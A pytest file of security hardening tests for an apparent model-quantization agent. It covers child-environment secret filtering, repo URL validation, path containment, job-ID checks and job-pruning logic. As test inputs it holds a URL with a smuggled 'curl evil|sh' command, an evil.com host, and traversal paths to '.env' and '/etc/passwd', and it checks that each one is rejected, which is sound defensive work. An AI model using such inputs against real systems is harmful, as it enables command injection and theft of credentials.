"""Tests for the security + correctness hardening pass.

Covers: child_env allowlist (SEC-1), repo_url validation + path containment (SEC-2/3),
job-id validation and the bounded/robust job wait (SEC-3/COR-3), and the tune-loop
prune keep-set that must survive a failed-iteration placeholder (COR-1).
"""
from __future__ import annotations

import os
import subprocess
import time
from unittest.mock import MagicMock

import pytest


# --------------------------------------------------------------------------- SEC-1
from quant_agent.config import child_env


def test_child_env_excludes_cloud_secrets(monkeypatch):
    for k in (
        "ANTHROPIC_API_KEY", "VOYAGE_API_KEY", "QDRANT_API_KEY",
        "R2_SECRET_ACCESS_KEY", "R2_ACCESS_KEY_ID", "GITHUB_TOKEN",
    ):
        monkeypatch.setenv(k, "secret-" + k)
    monkeypatch.setenv("HUGGINGFACE_HUB_TOKEN", "hf-tok")
    monkeypatch.setenv("PATH", os.environ.get("PATH", "/usr/bin"))

    env = child_env()
    for k in ("ANTHROPIC_API_KEY", "VOYAGE_API_KEY", "QDRANT_API_KEY",
              "R2_SECRET_ACCESS_KEY", "R2_ACCESS_KEY_ID", "GITHUB_TOKEN"):
        assert k not in env, f"{k} leaked into child env"
    assert env["HUGGINGFACE_HUB_TOKEN"] == "hf-tok"
    assert env["HF_TOKEN"] == "hf-tok"
    assert "PATH" in env


def test_child_env_include_hf_false_drops_token(monkeypatch):
    monkeypatch.setenv("HUGGINGFACE_HUB_TOKEN", "hf-tok")
    env = child_env(include_hf=False)
    assert "HF_TOKEN" not in env and "HUGGINGFACE_HUB_TOKEN" not in env


def test_child_env_extra_merges(monkeypatch):
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    env = child_env({"MEASURE_MODEL_PATH": "/x"})
    assert env["MEASURE_MODEL_PATH"] == "/x"


# --------------------------------------------------------------------------- SEC-2
from quant_agent.tools import repo_tool


def test_repo_url_rejects_shell_metachars():
    out = repo_tool.clone_method_repo.invoke(
        {"method_id": "awq", "repo_url": "https://github.com/x/y; curl evil|sh"}
    )
    assert "not a plain GitHub repo URL" in out


def test_repo_url_rejects_non_github():
    out = repo_tool.clone_method_repo.invoke(
        {"method_id": "awq", "repo_url": "https://evil.com/a/b"}
    )
    assert "not a plain GitHub repo URL" in out


def test_repo_url_must_be_a_catalog_repo(monkeypatch):
    # Well-formed GitHub URL, but not one this method declares in the catalog.
    monkeypatch.setattr(
        repo_tool, "_catalog_repo_urls",
        lambda mid: {"https://github.com/real/awq"},
    )
    out = repo_tool.clone_method_repo.invoke(
        {"method_id": "awq", "repo_url": "https://github.com/attacker/awq"}
    )
    assert "not a catalog repo" in out


# --------------------------------------------------------------------------- SEC-3
def test_safe_join_blocks_traversal(tmp_path):
    (tmp_path / "sub").mkdir()
    assert repo_tool._safe_join(tmp_path, "sub") is not None
    assert repo_tool._safe_join(tmp_path, "../../.env") is None
    assert repo_tool._safe_join(tmp_path, "/etc/passwd") is None


def test_read_repo_file_rejects_escape(tmp_path, monkeypatch):
    # Point the method's repo dir at a real tmp dir with one file.
    repo = tmp_path / ".venvs" / "awq" / "repo"
    repo.mkdir(parents=True)
    (repo / "README.md").write_text("hi")
    monkeypatch.setattr(repo_tool, "_repo_dir", lambda mid: repo)
    ok = repo_tool.read_repo_file.invoke({"method_id": "awq", "path": "README.md"})
    assert '"status": "ok"' in ok
    escaped = repo_tool.read_repo_file.invoke({"method_id": "awq", "path": "../../../.env"})
    assert "escapes repo" in escaped


from quant_agent import executor


def test_valid_job_id():
    assert executor.valid_job_id("20260710T120000Z-abcdef")
    assert not executor.valid_job_id("../../etc")
    assert not executor.valid_job_id("foo/bar")
    assert not executor.valid_job_id("")


# --------------------------------------------------------------------------- COR-3
def _write_meta(tmp_path, job_id, pid, pgid):
    jd = tmp_path / job_id
    jd.mkdir(parents=True, exist_ok=True)
    meta = executor.JobMeta(
        job_id=job_id, method_id="awq", model_id="m", venv="awq",
        script_path="s", output_dir="./quantized/x", pid=pid, started_at="t", pgid=pgid,
    )
    (jd / "meta.json").write_text(meta.to_json())
    return jd


def test_refresh_status_ignores_partial_sentinel(tmp_path, monkeypatch):
    monkeypatch.setattr(executor, "JOBS_ROOT", tmp_path)
    jid = "20260710T120000Z-000001"
    _write_meta(tmp_path, jid, pid=os.getpid(), pgid=os.getpgid(os.getpid()))

    # Empty sentinel (created, not yet written) -> still running, not a failure.
    (tmp_path / jid / "exit_code").write_text("")
    assert executor.refresh_status(jid).status == "running"

    # Non-numeric partial content -> still running.
    (tmp_path / jid / "exit_code").write_text("not-an-int")
    assert executor.refresh_status(jid).status == "running"

    # Clean "0" -> completed.
    (tmp_path / jid / "exit_code").write_text("0\n")
    assert executor.refresh_status(jid).status == "completed"


def test_wait_for_job_times_out_and_kills(tmp_path, monkeypatch):
    monkeypatch.setattr(executor, "JOBS_ROOT", tmp_path)
    proc = subprocess.Popen(["sleep", "30"], start_new_session=True)
    try:
        jid = "20260710T120000Z-000002"
        _write_meta(tmp_path, jid, pid=proc.pid, pgid=os.getpgid(proc.pid))
        meta = executor.wait_for_job(jid, poll_interval=0.05, max_wait_s=0.2)
        assert meta.status == "timeout"
    finally:
        try:
            proc.kill()
            proc.wait(timeout=5)
        except Exception:
            pass


# --------------------------------------------------------------------------- COR-1
def test_prune_keeps_best_despite_failure_placeholder(monkeypatch):
    from quant_agent import orchestrator as orch
    from quant_agent import tune_agent
    from quant_agent.pareto import Metrics

    def M(v):
        return Metrics(prefill_ms=v, decode_ms=v, vram_gb=v, ppl=v)

    def meta(jid):
        m = MagicMock()
        m.job_id = jid
        return m

    history = [
        tune_agent.IterationRecord(hyperparameters={}, metrics=M(1.0)),               # best
        tune_agent.IterationRecord(hyperparameters={}, metrics=None, note="adapt fail"),
        tune_agent.IterationRecord(hyperparameters={}, metrics=M(5.0)),               # worse
        tune_agent.IterationRecord(hyperparameters={}, metrics=M(6.0)),               # worse, latest
    ]
    metaA, metaC, metaD = meta("A"), meta("C"), meta("D")
    iter_metas = [metaA, None, metaC, metaD]

    pruned: list[str] = []
    monkeypatch.setattr(orch, "_prune_iteration", lambda m: pruned.append(m.job_id))
    orch._prune_intermediate_jobs(history, iter_metas)

    # Best (A) and latest (D) survive; only the non-best real job (C) is pruned; the
    # None placeholder is never handed to _prune_iteration.
    assert set(pruned) == {"C"}
    assert "A" not in pruned and "D" not in pruned
